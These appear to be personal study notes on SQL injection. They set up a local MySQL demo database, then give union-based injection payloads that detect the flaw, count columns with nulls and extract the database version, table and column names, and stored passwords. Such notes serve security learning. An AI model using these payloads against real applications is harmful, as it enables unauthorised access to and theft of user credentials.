<https://portswigger.net/web-security/sql-injection/cheat-sheet> #sql   
<https://appsecexplained.gitbook.io/appsecexplained/common-vulns/sql-injection-overview >
## Introduction 

```shell
sudo systemctl start mysql # start the mysql service
sudo mysql # login

# create DB and tables
CREATE DATABASE sqldemo; 
use sqldemo;
CREATE TABLE users(
	username varchar(255),
	password varchar(255),
	age int,
	PRIMARY KEY (username)

);
# insert data
INSERT INTO USERS (username,password,age)
VALUES("jeremy","letmein",30);

# QUERY DB
show databases;
show tables;
select * from users;
select age from users where username = "jeremy";
select age from users where username = "jeremy" union select password from users;
```

## Union
* Test if  SQL injection is possible by trying to generate an error in the DB/Web APP
	* Try sending single quote '  or double quotes ", to see if Error is generated
		*  `jeremy' `   
		* `jeremy"`
	* Try Logical operator  
		* `jeremy' or 1=1#`   
		* `jeremy' or 1=1-- -`
	* 
![[2-SQL Injection-union.png]]

* When Union selecting, you have to determine # of columns being used in the application
* `jeremy' union select null,null#`
* keep adding more nulls onto this query until you get a result
	* `jeremy' union select null,null,null,null#`
* Once you have determined the # of columns in the DB, you should be able to query for more things
```sql
jeremy' union select null,null,version()#  
jeremy' union select null,null,table_name from information_schema.tables#
jeremy' union select null,null,column_name from information_schema.columns#
jeremy' union select null,null,password from injection0x01#
```
![[2-SQL Injection-union-tables.png]]
* If the column data type is not compatible with string data, the injected query will cause a database error, such as: "`Conversion failed when converting the varchar value 'a' to data type int.`"
	* For instance, if there was an int, instead of a string, and you try to union select a string into a column that contains an int, you'll get an errror. So you'll have to play around and try basic integers, to see what matches up and works
	* `jeremy' union select null(int),1,null,null,password from injection0x01#`



